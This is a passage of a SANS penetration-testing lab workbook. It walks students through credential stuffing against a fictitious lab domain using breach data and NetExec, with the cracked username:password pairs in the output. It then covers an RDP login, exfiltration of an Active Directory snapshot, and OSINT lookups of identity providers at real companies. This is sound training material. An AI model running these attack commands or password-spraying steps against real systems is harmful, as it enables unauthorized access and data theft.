### **SEC560 | ENTERPRISE PENETRATION TESTING GIAC Penetration Tester (GPEN)**

# Workbook Sections 1-3

![](SEC560_WorkBook1_page_0_Picture_2.jpeg)

© 2025 SANS Institute. All rights reserved to SANS Institute.

PLEASE READ THE TERMS AND CONDITIONS OF THIS COURSEWARE LICENSE AGREEMENT ("CLA") CAREFULLY BEFORE USING ANY OF THE COURSEWARE (DEFINED BELOW) ASSOCIATED WITH THE SANS INSTITUTE COURSE. THIS IS A LEGAL AND ENFORCEABLE CONTRACT BETWEEN YOU (THE "USER") AND THE ESCAL INSTITUTE OF ADVANCED TECHNOLOGIES, INC. /DBA SANS INSTITUTE ("SANS INSTITUTE") FOR THE COURSEWARE. BY ACCESSING THE COURSEWARE, USER AGREES TO BE BOUND BY THE TERMS OF THIS CLA.

With this CLA, SANS Institute hereby grants User a personal, non-exclusive license to use the Courseware subject to the terms of this CLA. Courseware means all printed materials, including course books and lab workbooks, slides or notes, as well as any digital or other media, audio and video recordings, virtual machines, software, technology, or data sets distributed by SANS Institute to User for use in the SANS Institute course associated with the Courseware. User agrees that the CLA is the complete and exclusive statement of agreement between SANS Institute and User and that this CLA supersedes any oral or written proposal, agreement or other communication relating to the subject matter of this CLA.

BY ACCESSING THE COURSEWARE, USER AGREES TO BE BOUND BY THE TERMS OF THIS CLA. USER FURTHER AGREES THAT ANY BREACH OF THE TERMS OF THIS CLA MAY CAUSE IRREPARABLE HARM AND SIGNIFICANT INJURY TO SANS INSTITUTE, AND THAT SANS INSTITUTE MAY ENFORCE THESE PROVISIONS BY INJUNCTION (WITHOUT THE NECESSITY OF POSTING BOND), SPECIFIC PERFORMANCE, OR OTHER EQUITABLE RELIEF.

If User does not agree to the terms of this CLA, User should not access the Courseware. User may return the Courseware to SANS Institute for a refund, if applicable.

User may not copy, reproduce, re-publish, distribute, display, modify or create derivative works based upon all or any portion of the Courseware, in any medium, whether printed, electronic or otherwise, for any purpose, without the express prior written consent of SANS Institute. User may not sell, rent, lease, trade, share, or otherwise transfer the Courseware in any way, shape, or form to any person or entity without the express written consent of SANS Institute. Additionally, User may not upload, submit, or otherwise transmit Courseware to any artificial intelligence system, platform, or service for any purpose, regardless of whether the intended use is commercial, educational, or personal, without the express written consent of SANS Institute. User agrees that the failure to abide by this provision would cause irreparable harm to SANS Institute that is impossible to quantify. User therefore agrees to a base liquidated damages amount of \$5000.00 USD per item of Courseware infringed upon or fraction thereof. In addition, the base liquidated damages amount shall be doubled for any Courseware less than a year old as a reasonable estimation of the anticipated or actual harm caused by User's breach of the CLA. Both parties acknowledge and agree that the stipulated amount of liquidated damages is not intended as a penalty, but as a reasonable estimate of damages suffered by SANS Institute due to User's breach of the CLA.

If any provision of this CLA is declared unenforceable in any jurisdiction, then such provision shall be deemed to be severable from this CLA and shall not affect the remainder thereof. A written amendment or addendum to this CLA that is executed by SANS Institute and User may accompany this Courseware.

SANS Institute may suspend and/or terminate User's access to and require immediate return of any Courseware in connection with any (i) material breaches or material violation of this CLA or general terms and conditions of use agreed to by User, (ii) technical or security issues or problems caused by User that materially impact the business operations of SANS Institute or other SANS Institute customers, or (iii) requests by law enforcement or government agencies.

SANS Institute acknowledges that any and all software and/or tools, graphics, images, tables, charts or graphs presented in this Courseware are the sole property of their respective trademark/registered/copyright owners, including:

The Apple® logo and any names of Apple products displayed or discussed in this book are registered trademarks of Apple, Inc.

PMP® and PMBOK® are registered trademarks of PMI.

SOF-ELK® is a registered trademark of Lewes Technology Consulting, LLC. Used with permission.

SIFT® is a registered trademark of Harbingers, LLC. Used with permission.

VMware Workstation Pro®, VMWare Workstation Player®, VMWare Fusion®, and VMware Fusion Pro® are registered trademarks of VMware, Inc. Used with permission.

Governing Law: This CLA shall be governed by the laws of the State of Maryland, USA.

Courseware licensed to User under this CLA may be subject to export laws and regulations of the United States of America and other jurisdictions. User warrants he or she is not listed (i) on any sanction programs list maintained by the U.S. Office of Foreign Assets Control within the U.S. Treasury Department ("OFAC"), or (ii) denied party list maintained by the U.S. Bureau of Industry and Security within the U.S. Department of Commerce ("BIS"). User agrees to not allow access to any Courseware to any person or entity in a U.S. embargoed country or in violation of a U.S. export control law or regulation. User agrees to cooperate with SANS Institute as necessary for SANS Institute to comply with export requirements and recordkeeping required by OFAC, BIS or other governmental agency.

## *Welcome to the SANS Security 560 Electronic Workbook!*

Copyright ©2025, SANS Institute. All rights reserved to SANS Institute. This workbook is considered Courseware as defined by the SANS Courseware License Agreement found at https://www.sans.org/mlp/courseware-licensing-agreement/ and is subject to all terms and conditions of the agreement. Use of this workbook constitutes agreement with these conditions.

#### Welcome to the SANS SEC560 Electronic Workbook (EWB)!

This Electronic Workbook (EWB) is your guide to lab exercises in SANS SEC560. To keep labs current, make them more accessible (cut and paste!), and to present the steps in color with rich context, we present the material here in HTML format. You will also get a hard copy of the printed materials to keep as an heirloom (and to bring into an exam center when you take the GIAC exam).

This electronic workbook is a work in progress and is frequently revised by the course authors. This is beneficial to all, since you continue to get updates to lab material as we improve the quality of the exercises, correct typos, and add new exercises.

The Electronic Workbook (EWB) will update periodically throughout the day, as long as the virtual machines have internet access.

#### Accessing the EWB

To access the digital edition of the EWB from the SEC560 Linux VM, open the Firefox browser. The home page will display this text and allow you to navigate to the course lab exercises.

Similarly, you can access the digital edition of the EWB from the class Windows 11 VM as well. Open the Chrome browser and the home page will display this text.

#### Conventions

The following typographical conventions are used throughout the labs:

- *Italic*  Indicates new terms and items of emphasis •
- Constant width Used for terminal output and within paragraphs to refer to tools or other elements such as variables, function names, statements, keywords, etc. •
- | (vertical bar) The vertical bar is used to indicate steps necessary for navigating through menus (Edit | Paste) •

Code blocks are used to denote output from tools. For example:

#### Abstract

sec560@560vm:~\$ run\_this\_command output from the tool

We may use more complex commands where you need to be very careful of the prompt and you'll have a number of commands. When this happens, you will see the prompt and the command(s) you need to type in the *Output*.

pwd cd .. pwd

#### Expected Results

sec560@560vm:~\$ pwd /home/sec560 sec560@560vm:~\$ cd.. sec560@560vm:/home\$ pwd /home sec560@560vm:/home\$

In some cases, the commands you type will call for information that you supply (e.g., that we don't know). In these cases, the content that you supply is noted in brackets: [yourinput] . Replace [yourinput] with the information you supply as described in the exercise.

#### Course and Lab Feedback

We are always excited to hear your feedback on the course materials. Is there a bug we need to squash? Do you have a suggestion for a new awesome tool that we just *have* to see? Please reach out to Jeff or Jon directly:

- Jeff McJunkin jeff@roguevalleyinfosec.com •
- Jon Gorenflo jon@attackd.com •

Thank you!!

![](SEC560_WorkBook1_page_3_Picture_10.jpeg)

## *Lab 1.1: Credential Stuffing to a Breach*

#### Requires VPN Connection

You must have an active OpenVPN connection using the sec560-labs-range.ovpn file from https://connect.labs.sans.org to complete this exercise.

#### Background

You've been hired to conduct a penetration test of Hiboxy Corporation, a mid-sized technology company. During your initial reconnaissance, you discovered an exposed RDP server through Shodan searches. Your research into previous data breaches has uncovered credentials associated with @hiboxy.com email addresses.

As many users reuse passwords across services, you'll attempt credential stuffing attacks against the discovered RDP server. This lab demonstrates how attackers leverage breached credentials to gain initial access to corporate networks, and why password reuse remains one of the most critical security vulnerabilities organizations face.

#### Lab Setup

VMs used:

Windows 11 •

You should be able to ping 10.130.10.10 from the Windows 11 VM:

#### Command

ping 10.130.10.10

#### Expected Results

C:\Users\sec560> ping 10.130.10.10

Pinging 10.130.10.10 with 32 bytes of data:

Reply from 10.130.10.10: bytes=32 time<1ms TTL=127

Reply from 10.130.10.10: bytes=32 time<1ms TTL=127

Reply from 10.130.10.10: bytes=32 time<1ms TTL=127

Reply from 10.130.10.10: bytes=32 time<1ms TTL=127

Ping statistics for 10.130.10.10:

Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),

Approximate round trip times in milli-seconds:

Minimum = 0ms, Maximum = 0ms, Average = 0ms

#### Warning: OpenVPN Connection Required!

If you're unable to ping 10.130.10.10, you'll need to connect to the OpenVPN server before continuing. Browse to https:// connect.labs.sans.org/ and log in with your SANS account. Download the OpenVPN configuration file (filename sec560-labs-range.ovpn ) to your host operating system, copy and paste the file into your Windows virtual machine, then drag and drop into the OpenVPN profiles shortcut on the Windows desktop (accepting the admin rights prompt when asked). Finally, double-click on the OpenVPN GUI shortcut on the desktop, then right-click on the new OpenVPN tray icon and click Connect.

#### Lab – Step-by-Step Instructions

For this lab, you will find an exposed RDP server in the hiboxy.com Active Directory domain, find credentials for @hiboxy.com accounts from prior breaches, reuse those credentials to find working logins against the RDP server, then log in and exfiltrate data.

The lab demonstrates that breaches don't have to be complicated to be effective, nor do any "real" exploits need to be involved. Bugs get patched, but features are forever.

#### *1: Finding 1FA Services*

In reviewing Hiboxy's external network presence, you have already found an exposed RDP server using Shodan:

![](SEC560_WorkBook1_page_5_Figure_7.jpeg)

#### Note

The Shodan results were fabricated, as Hiboxy is a fictitious company used for this class. The 11.0.0.0/8 range is actually owned by the Department of Defense — do not scan or interact with this IP address.

Hiboxy has given you internal network access for this penetration test through OpenVPN. They've con firmed that RDP01, their RDP server, is available externally using NAT from their firewall, though it has an internal IP address of 10.130.10.23.

First, let's confirm the RDP server is accessible from the internal network. Start a new PowerShell window using the Terminal link on the desktop of your Windows 11 VM, then run the following command:

nmap 10.130.10.23 -p 3389 --script rdp-ntlm-info --unprivileged -Pn

#### Expected Results

PS C:\Users\sec560> nmap 10.130.10.23 -p 3389 --script rdp-ntlm-info --unprivileged -Pn Starting Nmap 7.95 ( https://nmap.org ) at 2024-08-13 14:09 Pacific Daylight Time Nmap scan report for ip-10-130-10-23.us-east-2.compute.internal (10.130.10.23) Host is up (0.079s latency).

PORT STATE SERVICE 3389/tcp open ms-wbt-server | rdp-ntlm-info: | Target\_Name: HIBOXY

| NetBIOS\_Domain\_Name: HIBOXY

| NetBIOS\_Computer\_Name: RDP01 | DNS\_Domain\_Name: hiboxy.com

| DNS\_Computer\_Name: rdp01.hiboxy.com

| DNS\_Tree\_Name: hiboxy.com | Product\_Version: 10.0.20348

|\_ System\_Time: 2024-08-13T21:10:00+00:00

Nmap done: 1 IP address (1 host up) scanned in 0.75 seconds

We've confirmed that the same RDP server is available internally. We've also confirmed the Active Directory domain name (hiboxy.com).

Since we're scanning over a VPN, we need the --unprivileged argument to Nmap. Since 10.130.10.23 doesn't reply to ports 80 -Pn argument

to skip the host discovery phase.

#### Tip

Microsoft Exchange also reveals the internal Active Directory domain name, and Exchange is commonly exposed externally. You can use the following command to find the domain name inside this environment if you're curious: nmap 10.130.10.25 - Pn -n -p 25 --script smtp-ntlm-info --unprivileged

#### *2: Searching through Breach Data*

Now that we know the Active Directory domain name, we can search through breach data for accounts with that domain. We have a file called C:\CourseFiles\breachdata.txt inside the Windows 11 VM that contains usernames and passwords from prior known breaches. We can use this data to attempt to log in to the RDP server.

We'll first look at the first three lines of the original breachdata.txt file to see the format of the data ( emailaddress:password). We'll then search for lines containing @hiboxy.com: and save them to a new file called hiboxy\_breachdata.txt , from which we'll extract the usernames and passwords.

#### Command

cd C:\CourseFiles

Get-Content breachdata.txt | Select-Object -First 3

# Get lines containing "@hiboxy.com:" using Select-String, without line numbers, and put them in hiboxy\_breachdata.txt

Select-String "@hiboxy.com:" C:\CourseFiles\breachdata.txt | Select-Object -ExpandProperty Line | Out-File encoding ascii hiboxy\_breachdata.txt

#### Expected Results

PS C:\WINDOWS\system32> cd C:\CourseFiles

PS C:\CourseFiles> Get-Content breachdata.txt | Select-Object -First 3

linda.miller@fabrikam.com:abc123

david.brown@northwindtraders.com:12345

john.smith@adatum.com:password123

PS C:\CourseFiles> # Get lines containing "@hiboxy.com:" using Select-String, without line numbers, and put them in hiboxy\_breachdata.txt

PS C:\CourseFiles> Select-String "@hiboxy.com:" C:\CourseFiles\breachdata.txt | Select-Object -

ExpandProperty Line | Out-File -encoding ascii hiboxy\_breachdata.txt

We'll extract the usernames and passwords from the hiboxy\_breachdata.txt file. First we'll extract the usernames (everything to the left of the @ symbol) and save them to a new file called hiboxy\_users.txt . Then we'll extract the passwords (everything to the right of the first : symbol, even if the password contains : ) and save them to a new file called hiboxy\_passwords.txt .

#### Command

Get-Content C:\CourseFiles\hiboxy\_breachdata.txt | ForEach-Object { \$\_.Split('@')[0] } | Out-File -encoding ascii C:\CourseFiles\hiboxy\_users.txt

Get-Content C:\CourseFiles\hiboxy\_breachdata.txt | ForEach-Object { \$\_.Split(':',2)[1] } | Out-File encoding ascii C:\CourseFiles\hiboxy\_passwords.txt

#### Expected Results

PS C:\CourseFiles> Get-Content C:\CourseFiles\hiboxy\_breachdata.txt | ForEach-Object { \$\_.Split('@')

[0] } | Out-File -encoding ascii C:\CourseFiles\hiboxy\_users.txt

PS C:\CourseFiles> Get-Content C:\CourseFiles\hiboxy\_breachdata.txt | ForEach-Object { \$\_.Split(':',2)

[1] } | Out-File -encoding ascii C:\CourseFiles\hiboxy\_passwords.txt

The first line in the hiboxy\_users.txt file correlates to the first line in the hiboxy\_passwords.txt file. Some tools allow you to use one file with credentials in username:password format (such as THC-Hydra, which we'll use later in class), but others do not.

#### *3: SMB Credential Stuffing*

Our next tool is NetExec, which is a penetration testing tool to help automate the security testing of large environments. We will use NetExec to attempt to log in to the RDP server using the credentials we found in the breach data. For the sake of a faster lab, we will use SMB as the target service. RDP is also available as an option, but the output is slower and less reliable in some situations.

| Command                                                                                                                                              |
|------------------------------------------------------------------------------------------------------------------------------------------------------|
|                                                                                                                                                      |
| nxc smb -u "C:\CourseFiles\hiboxy_users.txt" -p "C:\CourseFiles\hiboxy_passwords.txt" -d hiboxy.com<br>continue-on-successno-bruteforce 10.130.10.23 |
|                                                                                                                                                      |
|                                                                                                                                                      |
|                                                                                                                                                      |
|                                                                                                                                                      |
|                                                                                                                                                      |
|                                                                                                                                                      |
|                                                                                                                                                      |
|                                                                                                                                                      |
|                                                                                                                                                      |
|                                                                                                                                                      |
|                                                                                                                                                      |
|                                                                                                                                                      |
|                                                                                                                                                      |
|                                                                                                                                                      |
|                                                                                                                                                      |
|                                                                                                                                                      |
|                                                                                                                                                      |
|                                                                                                                                                      |
|                                                                                                                                                      |
|                                                                                                                                                      |
|                                                                                                                                                      |
|                                                                                                                                                      |
|                                                                                                                                                      |
|                                                                                                                                                      |
|                                                                                                                                                      |
|                                                                                                                                                      |
|                                                                                                                                                      |
|                                                                                                                                                      |
|                                                                                                                                                      |
|                                                                                                                                                      |
|                                                                                                                                                      |
|                                                                                                                                                      |
|                                                                                                                                                      |
|                                                                                                                                                      |

#### Expected Results

```
PS C:\CourseFiles> nxc smb -u "C:\CourseFiles\hiboxy_users.txt" -p "C:
\CourseFiles\hiboxy_passwords.txt" -d hiboxy.com --continue-on-success --no-bruteforce 
10.130.10.23
SMB 10.130.10.23 445 RDP01 [*] Windows Server 2022 Build 20348 
x64 (name:RDP01) (domain:hiboxy.com) (signing:False) (SMBv1:False)
SMB 10.130.10.23 445 RDP01 [-] hiboxy.com\jsmith:Summer2020! 
STATUS_LOGON_FAILURE
SMB 10.130.10.23 445 RDP01 [-] hiboxy.com\dmiller:nuggetnugget 
STATUS_LOGON_FAILURE
SMB 10.130.10.23 445 RDP01 [-] hiboxy.com\amartin:AstonMartinDB5 
STATUS_LOGON_FAILURE
SMB 10.130.10.23 445 RDP01 [-] hiboxy.com\jwood:Rockin10 
STATUS_LOGON_FAILURE
SMB 10.130.10.23 445 RDP01 [+] hiboxy.com\hmoore:Shane1**
SMB 10.130.10.23 445 RDP01 [-] hiboxy.com\mjohnson:Chocolate1! 
STATUS_LOGON_FAILURE
SMB 10.130.10.23 445 RDP01 [-] hiboxy.com\agardner:Vocabulary 
STATUS_LOGON_FAILURE
SMB 10.130.10.23 445 RDP01 [-] hiboxy.com\emartinez:Explorer007 
STATUS_LOGON_FAILURE
SMB 10.130.10.23 445 RDP01 [-] hiboxy.com\mlee:Musketeer_4th 
STATUS_LOGON_FAILURE
SMB 10.130.10.23 445 RDP01 [-] hiboxy.com\tanderson:MatrixRev9 
STATUS_LOGON_FAILURE
SMB 10.130.10.23 445 RDP01 [-] 
hiboxy.com\wwilliams:Williams@2020 STATUS_LOGON_FAILURE
SMB 10.130.10.23 445 RDP01 [-] hiboxy.com\jmartinez:Julio@2003 
STATUS_LOGON_FAILURE
SMB 10.130.10.23 445 RDP01 [-] hiboxy.com\khill:OverTheHill45 
STATUS_LOGON_FAILURE
SMB 10.130.10.23 445 RDP01 [-] hiboxy.com\swilson:SeahawksFan52 
STATUS_LOGON_FAILURE
SMB 10.130.10.23 445 RDP01 [-] hiboxy.com\dbrown:BostonCeltics#1 
STATUS_LOGON_FAILURE
SMB 10.130.10.23 445 RDP01 [-] hiboxy.com\cdavis:ClaraD!2020 
STATUS_LOGON_FAILURE
SMB 10.130.10.23 445 RDP01 [-] hiboxy.com\hthomas:TommyBoy2022 
STATUS_LOGON_FAILURE
SMB 10.130.10.23 445 RDP01 [+] 
hiboxy.com\sbishop:Ethnogeographically1
SMB 10.130.10.23 445 RDP01 [-] hiboxy.com\rduran:Winter2018! 
STATUS_LOGON_FAILURE
SMB 10.130.10.23 445 RDP01 [-] 
hiboxy.com\rrodriguez:Rodriguez24@ STATUS_LOGON_FAILURE
SMB 10.130.10.23 445 RDP01 [-] hiboxy.com\syoung:Youngster52 
STATUS_LOGON_FAILURE
SMB 10.130.10.23 445 RDP01 [-] hiboxy.com\mgarcia:MariaG2020* 
STATUS_LOGON_FAILURE
```

SMB 10.130.10.23 445 RDP01 [-] hiboxy.com\awright:WrightFlight1903 STATUS\_LOGON\_FAILURE SMB 10.130.10.23 445 RDP01 [+] hiboxy.com\apena:F1r3Dr@g0n SMB 10.130.10.23 445 RDP01 [-] hiboxy.com\bhall:BeachBum\$29 STATUS\_LOGON\_FAILURE STATUS\_LOGON\_FAILURE SMB 10.130.10.23 445 RDP01 [-] hiboxy.com\nlopez:Spring2019 STATUS\_LOGON\_FAILURE SMB 10.130.10.23 445 RDP01 [-] hiboxy.com\jclark:ClarkKent2019 STATUS\_LOGON\_FAILURE SMB 10.130.10.23 445 RDP01 [-] hiboxy.com\eharris:EddieMoney2020 STATUS\_LOGON\_FAILURE

For context, here are the command line options used:

- smb Use the SMB protocol •
- -u "C:\CourseFiles\hiboxy\_users.txt" Use the usernames in the file hiboxy\_users.txt •
- -p "C:\CourseFiles\hiboxy\_passwords.txt" Use the passwords in the file hiboxy\_passwords.txt •
- -d hiboxy.com Use the domain hiboxy.com (as opposed to local credentials) •
- --continue-on-success Continue trying other credentials even if one is successful •
- --no-bruteforce Use paired usernames and passwords from the files; don't try variations (first username with first password, second username with second password, etc.) •

While we could try variations of breached passwords, or try other usernames using sources like Statistically Likely Usernames, for now we have working credentials, so let's move on to logging on using those.

#### *4: Finding, Gathering, and Exfiltrating Sensitive Data*

Let's log on using our found credentials. Pick one of the three accounts to log in with, then start the built-in RDP client on Windows.

![](SEC560_WorkBook1_page_12_Figure_0.jpeg)

#### Note

Your output, naturally, may vary from the Get-Random command.

That last command ( mstsc) will launch the Remote Desktop Connection application, which should look like the following:

![](SEC560_WorkBook1_page_12_Picture_4.jpeg)

Enter 10.130.10.23 as the destination computer, then click Show Options. Enter the username you randomly chose above, including the domain (such as hiboxy\hmoore). Under the Local Resources tab, click More... and ensure that Drives is checked, as shown below:

![](SEC560_WorkBook1_page_13_Figure_0.jpeg)

Click OK to confirm the local devices, then accept the remote connection by clicking Connect when prompted:

![](SEC560_WorkBook1_page_13_Figure_2.jpeg)

Then enter the password for the account you chose above.

If prompted again for a certificate warning, click Yes.

As a reminder, here are the three accounts that worked:

hiboxy.com\hmoore:Shane1\*\* hiboxy.com\sbishop:Ethnogeographically1 hiboxy.com\apena:F1r3Dr@g0n

After logging on, you should see a desktop like the following:

![](SEC560_WorkBook1_page_14_Picture_1.jpeg)

Excellent! An authenticated internal session with the ability to run arbitrary code is a powerful position for attackers. Let's start by gathering information about the environment. We'll use Active Directory Explorer (ADExplorer) to examine the Active Directory environment of Hiboxy. We'll also be able to take a snapshot of the Hiboxy AD environment for analysis on our own machine, as well as discover and exfiltrate some other sensitive data.

Click the Windows folder icon in the lower-left corner of the screen:

![](SEC560_WorkBook1_page_14_Picture_4.jpeg)

Next, click This PC in the resulting *File Explorer* window. Under *Redirected drives and folders*, double-click on C on SEC560- WINDOWS:

![](SEC560_WorkBook1_page_15_Picture_1.jpeg)

Next, browse to the bin directory, then double-click on ADExplorer:

![](SEC560_WorkBook1_page_15_Picture_3.jpeg)

If prompted, accept the license agreement by clicking Agree. Once ADExplorer is open, leave the connection information blank (it will default to the current Active Directory domain) and click OK:

![](SEC560_WorkBook1_page_16_Picture_0.jpeg)

A view of Hiboxy's Active Directory environment will appear, similar to Active Directory Users and Computers. You can navigate through the tree on the left side of the window to explore the environment if you like.

Click File in the top-left corner of the window, then click Create Snapshot. Click the ellipsis (...) to choose a location to save the snapshot, click the Desktop shortcut under the *Quick access* menu on the left, enter Hiboxy-snapshot in the *File name:* field, click Save, then click OK:

![](SEC560_WorkBook1_page_17_Figure_0.jpeg)

You can now close ADExplorer. Next, we'll exfiltrate the snapshot. Right-click on the Hiboxy-snapshot file on the desktop and click Cut, then right-click into the still-open *File Explorer* window and click Paste. This will move the snapshot to the Windows 11 VM's C:\bin directory.

#### Information

ADExplorer could save directly to the C:\bin directory, but it would take longer due to RDP's file latency.

Go ahead and close the Remote Desktop connection by clicking the X in the top middle area of the screen:

![](SEC560_WorkBook1_page_17_Picture_5.jpeg)

#### *5: Analyzing Exfiltrated ADExplorer Data*

Even if Hiboxy were to notice the RDP connection and exfiltration of the snapshot, they cannot remove your copy of the exfiltrated data. We also used a Microsoft-signed binary (ADExplorer) to gather the data, so any AV or EDR solutions would likely ignore the activity.

Next, go ahead and open up ADExplorer, this time on our Windows 11 VM. You can find the ADExplorer executable in the C:\bin directory. Open it up (accepting the EULA if asked), then choose the Enter the path of a previous snapshot to load. radio button. Click the ellipsis button (...) to the right of the Path: text window, navigate to the C:\bin directory, select the Hiboxy-snapshot file, then click Save:

![](SEC560_WorkBook1_page_18_Picture_1.jpeg)

Click OK to load the snapshot. You should see the same view of the Hiboxy Active Directory environment that you saw on the RDP server.

Click on the DC=hiboxy,DC=com icon on the left side of the ADExplorer window. On the right window pane, you'll see LDAP attribute names and values for the domain object itself.

First, look at ms-DS-MachineAccountQuota. See how its value is set to 10? This is the dangerous, default setting. This means that any user can create up to 10 computer accounts in the domain. While not *inherently* dangerous, it can be combined with other flaws to enable some dangerous attacks, and should be a finding in a penetration test. Instead, dedicated accounts should be used for creating computer accounts, and the value of ms-DS-MachineAccountQuota should be 0.

Next, look at minPwdLength, which is 7. When combined with lockoutThreshold of 0 (no lockout), this means that a passwordguessing attack can be performed with no repercussions. The pwdProperties attribute is set to 1, which means that passwords must be "complex". These settings combine for a very weak password policy, and one in which attackers can guess passwords as fast as servers will allow without any repercussions or potential production impact.

For now, let's close ADExplorer. We'll certainly examine Hiboxy in more detail in future labs, but we've already found some high-risk findings.

#### Conclusion

In this lab, we found an exposed RDP server in the Hiboxy domain, found breached credentials for the domain, used those credentials to log in to the RDP server, and exfiltrated sensitive data. We found that the domain has a weak password policy and a dangerous default setting for creating computer accounts.

Importantly, we also saw that a breach doesn't have to be complicated to be effective, nor do patchable flaws need to be involved.

Would you like to do more? Here are some ideas:

- Dump an authoritative list of all users in the domain (using Impacket's GetADUsers.py script), then spray common passwords against them •
- Spray common passwords (https://weakpasswords.net/) as well as known-breached passwords •
- Try variations of the known-breached credentials using hashcat rules like best66.rule or your own human intellect (for example, updating a prior breached password of Winter2018! to Summer2024!) •

#### Bonus

Two users have the same password *pattern* as found in C:\CourseFiles\breachdata.txt file:

- Nathan Lopez (HR), nlopez@hiboxy.com, appears in breach data as Spring2019. Breach data is inherently aged, however, so try the current and next season! •
- Rachel Duran (Marketing), rduran@hiboxy.com, appears in breach data as Winter2018! . Try the same pattern (with the ! ) for the current and next season! •

Two users have small variations in their passwords as found in C:\CourseFiles\breachdata.txt file:

- Andrea Gardner, agardner@hiboxy.com, appears in breach data as Vocabulary. Try appending numbers or special characters to the end of the password. •
- Jonathan Wood, jwood@hiboxy.com , appears in breach data as Rockin10. Try appending numbers or special characters to the end of the password. •

## *Lab 1.2: Reconnaissance and OSINT*

#### No VPN Required

This exercise does not require an OpenVPN connection. Internet access is required.

#### Background

Before launching attacks against Hiboxy, you need to gather comprehensive intelligence about their infrastructure and potential attack surfaces. Using only publicly available information, you'll investigate how email flows to the company, identify their public IP space, discover third-party services they use, and map out their web presence through Certificate Transparency logs.

Your investigation will reveal exposed authentication endpoints, including Exchange servers with NTLM authentication enabled - a critical finding since these endpoints can be attacked even when MFA is enabled elsewhere. Through DNS reconnaissance, you'll also uncover the various cloud services and SaaS platforms Hiboxy uses, providing valuable intelligence for social engineering and password spraying attacks. This passive reconnaissance phase ensures you understand the target environment thoroughly before any active engagement begins.

→

#### Lab Setup

VM used:

Windows •

#### Lab – Step-by-Step Instructions

In this lab we'll demonstrate some of the reconnaissance techniques used to hone in on a target organization, finding useful attack surface for later attacks. We'll look at a few example organizations, and at the end you'll have a chance to try these same approaches against a random S&P 500 company yourself as a bonus.

Remember: You are not authorized to attack any target. We're purely looking at publicly available information.

#### *1: How Email Flows to a Company*

In order to receive email, a company needs to publish MX records in DNS. These records point to the mail servers that will accept email for the domain. We'll use PowerShell to look up MX records for a few companies.

Open a PowerShell terminal by clicking the "Terminal" link on your Desktop to run the following:

![](SEC560_WorkBook1_page_21_Figure_0.jpeg)

Your exact columns may differ, depending on the size of your PowerShell window. Here, we see that emails sent to @lowes.com addresses are sent to Microsoft 365 ( mail.protection.outlook.com ). In other words, email flows directly to Microsoft from the source email server.

What other options are there? Some companies use third-party email security services, such as ProofPoint or Mimecast, to filter email before it reaches their mail servers. Let's look at an example of a company that uses ProofPoint -- SANS.

![](SEC560_WorkBook1_page_21_Figure_3.jpeg)

#### Curious about a Linux equivalent to Resolve-DnsName?

The dig command can be used on Linux to look up DNS records. The equivalent command is:

dig sans.org MX +short

Here, we see that emails sent to @sans.org addresses are sent to ProofPoint's email filtering service first. After filtering, ProofPoint will forward the email to SANS' actual mail servers. How do we know where the actual mail servers are? Sometimes this can be tricky, but we can easily check if the company uses Microsoft 365 specifically via the GetUserRealm endpoint. This endpoint is used by Microsoft applications to determine how to authenticate users for a given domain. It will tell us if the domain uses Microsoft directly, or if it uses a third-party identity provider such as Okta, PingIdentity, SecureAuth, RSA SecurID Access, or ADFS.

The GetUserRealm endpoint is located at: https://login.microsoftonline.com/GetUserRealm.srf , and takes the login query parameter, which is the email address to look up. We can use any email address at the target domain (whether or not it actually exists). Let's look up the sans.org domain:

#### Command

Invoke-WebRequest-Uri "https://login.microsoftonline.com/GetUserRealm.srf? login=invalid@sans.org" | Select-Object -ExpandProperty Content | ConvertFrom-Json

#### Expected Results

State : 4 UserState : 1

Login : invalid@sans.org NameSpaceType : Managed DomainName : sans.org

FederationBrandName : Escal Institute of Advanced Technologies DBA SANS Institute

CloudInstanceName : microsoftonline.com

CloudInstanceIssuerUri : urn:federation:MicrosoftOnline

In this case, it's pretty clear that emails to @sans.org addresses are sent to ProofPoint first, and then forwarded to Microsoft 365. We can also see that SANS uses Microsoft directly for identity management, as indicated by the NameSpaceType of Managed.

What options are there for the NameSpaceType?

- Managed: The domain uses Microsoft directly for identity management. •
- Federated: The domain uses a third-party identity provider for identity management. The AuthURL field will indicate the URL of the identity provider. •
- Unknown: The domain does not use Microsoft 365. •

#### Want to see some Federated examples?

Here are some examples of companies that use third-party identity providers. The AuthURL field indicates the URL of the identity provider. You can visit these URLs in a web browser to see the login page for the identity provider (though naturally, they are subject to change).

You can look up the current result for any one of these companies using the same GetUserRealm URL we used above, such as https://login.microsoftonline.com/GetUserRealm.srf?login=invalid@packagingcorp.com (replacing the domain as needed).

- SecureAuth (packagingcorp.com): https://idp.packagingcorp.com/SecureAuth23/? username=invalid%40packagingcorp.com&wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline&wctx= •
- Okta (wm.com): https://wmlogin.wm.com/app/office365/exk37yw079IDNyIam4x7/sso/wsfed/passive? username=invalid%40wm.com&wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline&wctx= •
- RSA SecurID Access (hosthotels.com): https://guestservices.rap.hosthotels.com/IdPServlet?idp\_id=14knwft3srifx •
- ADFS (lowes.com): https://sts.lowes.com/adfs/ls/? username=invalid%40lowes.com&wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline&wctx= •
- Okta (match.com): https://match.okta.com/app/office365/exkeoydqsycke55hh356/sso/wsfed/passive? username=invalid%40match.com&wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline&wctx= •
- PingIdentity (abbvie.com): https://federation.abbvie.com/idp/prp.wsf? username=invalid%40abbvie.com&wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline&wctx= •

#### Tip on Active Directory: Federation Services (ADFS)

If you see /adfs/ls/ in the URL, the company is using ADFS as their identity provider. ADFS is an on-premises identity provider that integrates with Active Directory. Be sure to visit the web page and look carefully for any changes. Companies will often provide links to reset passwords, contact support, or other useful information.

If a company doesn't use Microsoft 365, we can often find their actual mail servers by looking up the domain's SPF record, which is a DNS TXT record that indicates which mail servers are authorized to send email for the domain. Let's look up the SPF records for fastenal.com as an example:

